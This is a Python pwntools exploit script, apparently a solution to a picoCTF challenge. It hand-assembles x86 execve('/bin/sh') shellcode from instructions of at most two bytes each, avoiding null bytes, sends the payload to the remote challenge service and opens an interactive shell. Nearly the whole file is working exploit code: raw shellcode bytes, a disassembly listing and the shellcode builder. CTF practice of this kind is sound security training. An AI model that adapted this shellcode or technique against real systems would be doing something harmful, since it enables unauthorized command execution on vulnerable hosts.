from pwn import *

def sandbox():
    f = open('./temp', 'wb')

    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    shellcode = b"\x31\xc0\x50\x68\x2f\x68\x2f\x68\x73\x68\x68\x68\x2f\x68\x62\x68\x69\x68\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    f.write(shellcode)
    f.close()

def create_shellcode():
    '''
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
 '''

    instructions = [
        'xor eax, eax',
        'push eax',


        'xor eax, eax',

        'mov al, 0x68',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

        #'mov al, 0x68',
        'mov al, 0x73',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

#        'mov al, 0x73',
        'mov al, 0x2f',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

        'mov al, 0x2f',
        'push eax',



        'xor eax, eax',
        'mov al, 0x6e',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

        'mov al, 0x69',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

        'mov al, 0x62',
        'shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax','shl eax',

        'mov al, 0x2f',
        'push eax',

        #'push 0x68732f2f',
        #'push 0x6e69622f',
        
        'xor eax, eax',         
        'mov ebx, esp',
        'mov edx, eax',
        'mov ecx, eax',
        'mov al, 0xb',
        'int 0x80',
#        'xor eax,eax',
#        'inc eax',
#        'int 0x80'
    ]
    shellcode = b''
    for i,v in enumerate(instructions):
        temp = asm(v, arch='i386', os='linux')
        if len(temp) == 1:
            temp += b'\x90'
        elif len(temp) > 2:
            print(v)
        assert(len(temp) <=2 )
        assert(b'00' not in temp)
        shellcode += temp
    
    shellcode += b'\x90'
    assert(len(shellcode) < 1000)

    print(shellcode)
    print(shellcode.hex())
    
    f = open('./temp', 'wb')
    f.write(shellcode)
    f.close()

    return shellcode
    

def main():
    sh = create_shellcode()
    LOCAL = False
    if LOCAL:
        p = process('./fun')
    else:
        p = remote('mercury.picoctf.net', 28494)

    
    l = p.recvuntil(b'run:\n')
    print(l)
    p.sendline(sh)
    p.interactive()
    

if __name__ == '__main__':
    main()
